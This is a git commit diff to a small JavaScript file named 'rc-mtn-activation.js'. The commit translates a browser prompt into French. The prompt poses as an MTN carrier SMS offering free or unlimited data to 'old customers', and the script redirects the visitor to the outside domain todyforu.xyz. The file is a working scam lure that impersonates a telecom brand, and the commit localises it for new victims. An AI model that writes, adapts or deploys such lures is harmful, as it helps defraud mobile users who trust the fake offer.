eabfe14f7ec1de8df28de52904cd45d4c3ee1e0b
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-10 09:16:45 -0700

    Update rc-mtn-activation.js

--- rc-mtn-activation.js
+++ rc-mtn-activation.js
@@ -1,5 +1,5 @@
 var password = '1'
-password=prompt('MTN SMS: Dear customer, please check if your MTN SIM card is eligible to receive 5GB to unlimited data, reward for old customers, press 1 to check now. ','1');
+password=prompt('MTN SMS: Cher client, veuillez vérifier si votre carte SIM MTN est éligible pour recevoir 5 Go de données illimitées, récompense pour les anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
 if (password != '1') {
 location.href='https://todyforu.xyz/rc-mtn.html';
 }
